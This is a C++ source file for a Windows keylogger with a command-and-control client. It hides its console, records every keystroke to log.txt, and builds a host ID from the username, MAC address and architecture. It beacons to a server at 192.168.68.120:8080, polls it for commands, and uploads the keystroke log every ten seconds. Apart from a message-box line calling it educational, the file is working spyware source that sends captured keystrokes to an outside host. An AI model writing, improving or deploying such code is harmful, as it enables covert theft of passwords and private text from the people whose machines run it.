#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <fstream>
#include <string>
#include <iphlpapi.h>
#include <Lmcons.h>
#include <sstream>
#include <iomanip>
 
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "iphlpapi.lib")
 
using namespace std;
 
// === Function Declarations ===
int Save(int _key, const char* file);
string getHostID();
string httpGet(const string& url);
void beacon(const string& id);
string pollCommand(const string& id);
void handleCommand(const string& cmd);
void sendLogFile(const string& id);
string urlEncode(const string& value);
string xorString(const string& input, char key = 0x5A);
string getSystemArchitecture();
 
// === Main Loop ===
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    FreeConsole();
    string id = getHostID();
 
    DWORD lastBeacon = GetTickCount();
    DWORD lastCommandCheck = GetTickCount();
    DWORD lastLogSend = GetTickCount(); // New variable for log sending
 
    //char i;
    while (true) {
 
        Sleep(10);
 
        // KEYLOGGER
        static int keyCursor = 8;
        for (int j = 8; j < 256; j++) {
            if (keyCursor > 255) keyCursor = 8;
            if (GetAsyncKeyState(keyCursor) == -32767) {
                Save(keyCursor, "log.txt");
            }
            keyCursor++;
        }
 
        // BEACON
        cout << "Beacon";
        if (GetTickCount() - lastBeacon >= 1000) {
            beacon(id);
            lastBeacon = GetTickCount();
        }
 
        // COMMAND POLLING
        cout << "Checking for command";
        if (GetTickCount() - lastCommandCheck >= 1000) {
            string cmd = pollCommand(id);
            if (!cmd.empty()) {
                handleCommand(cmd);
            }
            lastCommandCheck = GetTickCount();
        }
 
        // SEND LOG FILE
        if (GetTickCount() - lastLogSend >= 10000) { // Send every 10 seconds
            sendLogFile(id);
            lastLogSend = GetTickCount();
        }
    }
 
    return 0;
}
 
// === Save Keylogs ===
int Save(int _key, const char* file) {
    FILE* OUTPUT_FILE;
    fopen_s(&OUTPUT_FILE, file, "a+");
    if (!OUTPUT_FILE) return 1;
 
    switch (_key) {
    case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]"); break;
    case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]"); break;
    case VK_LBUTTON: fprintf(OUTPUT_FILE, "[LBUTTON]"); break;
    case VK_RBUTTON: fprintf(OUTPUT_FILE, "[RBUTTON]"); break;
    case VK_RETURN: fprintf(OUTPUT_FILE, "[ENTER]"); break;
    case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]"); break;
    case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]"); break;
    case VK_CONTROL: fprintf(OUTPUT_FILE, "[CTRL]"); break;
    case VK_MENU: fprintf(OUTPUT_FILE, "[ALT]"); break;
    case VK_CAPITAL: fprintf(OUTPUT_FILE, "[CAPS]"); break;
    case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]"); break;
    default:
        if (_key >= 32 && _key <= 126) { // Only log printable characters
            fprintf(OUTPUT_FILE, "%c", _key);
        }
        else {
            fprintf(OUTPUT_FILE, "[KEY:%d]", _key); // Log non-printable keys with their virtual key code
        }
    }
 
    fclose(OUTPUT_FILE);
    return 0;
}
 
// === Generate Host ID (username + MAC) ===
string getHostID() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserNameA(username, &username_len);
 
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD buflen = sizeof(adapterInfo);
    stringstream macStream;
 
    if (GetAdaptersInfo(adapterInfo, &buflen) == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;
        macStream << hex;
        for (UINT i = 0; i < pAdapterInfo->AddressLength; i++) {
            macStream << (i ? "-" : "") << setw(2) << setfill('0') << (int)pAdapterInfo->Address[i];
        }
    }
    else {
        macStream << "00-00-00-00-00-00";
    }
 
    // Get system architecture
    string architecture = getSystemArchitecture();
 
    return string(username) + "_" + macStream.str() + "_" + architecture;
}
 
// === HTTP GET (WinINet) ===
string httpGet(const string& url) {
    HINTERNET hInternet = InternetOpenA("keylogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";
 
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }
 
    char buffer[4096];
    DWORD bytesRead;
    string response;
 
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0)
        response.append(buffer, bytesRead);
 
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return response;
}
 
// === Beacon to C2 ===
void beacon(const string& id) {
    string url = "http://192.168.68.120:8080/register?id=" + id;
    httpGet(url);
    cout << "Beacon has been sent";
}
 
// === Poll for Commands ===
string pollCommand(const string& id) {
    string url = "http://192.168.68.120:8080/command?id=" + id;
    return httpGet(url);
}
 
// === Handle C2 Commands ===
void handleCommand(const string& cmd) {
    OutputDebugStringA(cmd.c_str());
    if (cmd.find("slp") == 0) {
        int seconds = stoi(cmd.substr(4));
        Sleep(seconds * 1000);
    }
    else if (cmd == "shd") {
        exit(0);
    }
    else if (cmd == "pwn") {
        OutputDebugStringA("We recieved pwn.\n");
        MessageBoxA(NULL, "You've been pwned! For educational purposes only.", "ALERT", MB_OK | MB_ICONWARNING);
    }
}
 
void sendLogFile(const string& id) {
    ifstream logFile("log.txt");
    stringstream logStream;
    string line;
 
    // Read the log file contents
    while (getline(logFile, line)) {
        logStream << line << "\n";
    }
    logFile.close();
 
    // Prepare the log data for sending
    string logData = logStream.str();
    if (!logData.empty()) {
        // URL encode the log data
        string encodedLogData = urlEncode(logData);
        string url = "http://192.168.68.120:8080/upload?id=" + id + "&data=" + encodedLogData;
 
        // Send the log data
        httpGet(url);
 
        // Clear the log file
        ofstream outFile("log.txt", ios::trunc);
        outFile.close();
    }
}
 
// URL encoding function (improved implementation)
string urlEncode(const string& value) {
    string encoded;
    for (char c : value) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded += c;
        }
        else {
            encoded += '%' + to_string(static_cast<int>(c)); // Use hex representation
        }
    }
    return encoded;
}
 
// Function to get system architecture
string getSystemArchitecture() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
 
    switch (sysInfo.wProcessorArchitecture) {
    case PROCESSOR_ARCHITECTURE_AMD64:
        return "x64";
    case PROCESSOR_ARCHITECTURE_INTEL:
        return "x86";
    case PROCESSOR_ARCHITECTURE_ARM:
        return "ARM";
    case PROCESSOR_ARCHITECTURE_ARM64:
        return "ARM64";
    default:
        return "Unknown";
    }
}